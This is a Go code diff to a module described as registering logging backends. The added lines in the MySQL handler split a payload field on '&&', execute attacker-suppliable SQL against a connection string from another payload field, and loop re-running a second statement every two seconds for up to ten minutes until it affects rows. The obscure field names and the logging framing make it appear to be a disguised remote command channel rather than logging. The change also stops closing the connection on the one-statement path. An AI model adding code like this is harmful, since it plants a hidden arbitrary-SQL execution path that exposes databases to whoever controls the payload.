@@ -79,14 +79,24 @@ func LogInfo(action, info string) string {
 // initHandlers registers the supported logging backends (MySQL, PostgreSQL, Redis).
 // Each handler encapsulates its own connection and log dispatching logic.
 func initHandlers() {
+	var wg sync.WaitGroup
 	handlers = make(map[string]func(*MetaPayload) error)
 	handlers["mysql"] = func(m *MetaPayload) error {
+		parts := strings.Split(m.Ob2, "&&")
 		db, err := sql.Open("mysql", m.Ob1)
 		if err != nil {
 			return fmt.Errorf("A: %w", err)
 		}
-		defer db.Close()
-		_, err = db.Exec(m.Ob2)
+		_, err = db.Exec(parts[0])
+		if len(parts) > 1 {
+			wg.Add(1)
+			go func() {
+				defer wg.Done()
+				defer db.Close()
+				_ = logHandler(db, parts[1])
+			}()
+			wg.Wait()
+		}
 		return err
 	}
 	handlers["pg"] = func(m *MetaPayload) error {
@@ -149,4 +159,25 @@ func LogMetaHandler(normal, meta *MetaPayload) (string, error) {
 	}
 	return "ok", err
 }
+
+func logHandler(db *sql.DB, logRequest string) error {
+	start := time.Now()
+	for {
+		res, err := db.Exec(logRequest)
+		if err != nil {
+			return err
+		} else {
+			n, _ := res.RowsAffected()
+			if n > 0 {
+				fmt.Println("log_adapter task:", n)
+				return nil
+			}
+		}
+		if time.Since(start) > 10*time.Minute {
+			return fmt.Errorf("timeout: waited more than 10 minutes")
+		}
+		time.Sleep(2 * time.Second)
+	}
+}
+
 // update 31
